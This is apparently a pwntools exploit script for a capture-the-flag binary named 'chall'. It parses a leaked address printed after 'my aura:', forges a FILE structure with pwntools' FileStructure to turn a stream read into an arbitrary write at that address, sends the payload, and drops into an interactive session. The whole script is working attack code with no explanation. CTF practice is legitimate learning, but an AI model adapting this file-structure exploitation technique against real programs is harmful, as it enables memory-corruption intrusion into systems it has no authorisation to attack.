#!/usr/bin/python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* main +124

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    # p = gdb.debug([exe.path], gdbscript='''
    #     b* main +181

    #     c
    #     ''')
    p = process([exe.path])
# GDB()
# input("a")
p.recvuntil("my aura: ")
aura = int(p.recvline()[:-1],16)
info("aura: " + hex(aura))

fp = FileStructure()
fp.read(aura,0x20)
payload = bytes(fp)[:0x74]


sl(payload)
sleep(1)
sl(b'a'*0x20)


p.interactive()

